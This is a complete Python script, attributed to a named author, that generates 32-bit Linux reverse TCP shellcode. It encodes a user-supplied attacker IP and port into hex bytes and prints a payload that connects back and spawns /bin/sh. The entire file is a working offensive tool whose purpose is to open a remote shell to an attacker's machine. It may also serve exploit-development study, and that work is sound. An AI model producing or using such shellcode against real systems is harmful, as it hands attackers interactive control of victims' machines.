#!/bin/python
# Generates a Linux 32-bit Shell Reverse TCP
# Written by Hussien Yousef
import sys

shellcode1="\\x31\\xc0\\x50\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x31\\xd2\\xb2\\x66\\x92\\x31\\xdb"
shellcode2=""
esp_adj = "\\x83\\xec\\x03\\x66\\x68"
shellcode3="\\xb3\\x03\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\x89\\xd3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf7\\xeb\\x0b\\x5b\\x31\\xc0\\xb0\\x0b\\x31\\xc9\\x31\\xd2\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"

if len(sys.argv) != 3:
	print("Usage: python "+str(sys.argv[0])+" <attacker_ip> <destination_port>")
else:
	print("Your Linux 32-bit Reverse TCP Shell:")
	port_num = str(hex(int(sys.argv[2])))
	ip1=""
	ip2=""
	ip3=""
	ip4=""
	loc = 1
	for i in str(sys.argv[1]):
		if i == ".":
			loc = loc + 1
			continue
		if loc == 1:
			ip1 = ip1 + i
		elif loc == 2:
			ip2 = ip2 + i
		elif loc == 3:
			ip3 = ip3 + i
		else:
			ip4 = ip4 + i
	shellcode2="\\x6a"+"\\x"+str(hex(int(ip4)))[2:]
	if ip3 == "0":
		shellcode2 = shellcode2 + "\\x88\\x5c\\x24\\xff"
	else:
		shellcode2 = shellcode2 + "\\xc6\\x44\\x24\\xff" + "\\x" + str(hex(int(ip3)))[2:]

	if ip2 == "0":
		shellcode2 = shellcode2 + "\\x88\\x5c\\x24\\xfe"
	else:
		shellcode2 = shellcode2 + "\\xc6\\x44\\x24\\xfe" + "\\x" + str(hex(int(ip2)))[2:]

	shellcode2 = shellcode2 + "\\xc6\\x44\\x24\\xfd"+"\\x" + str(hex(int(ip1)))[2:]
	port_hex = "\\x"+ port_num[2:4]+ "\\x" + port_num[4:6]

	print(shellcode1+shellcode2+esp_adj+port_hex+shellcode3)
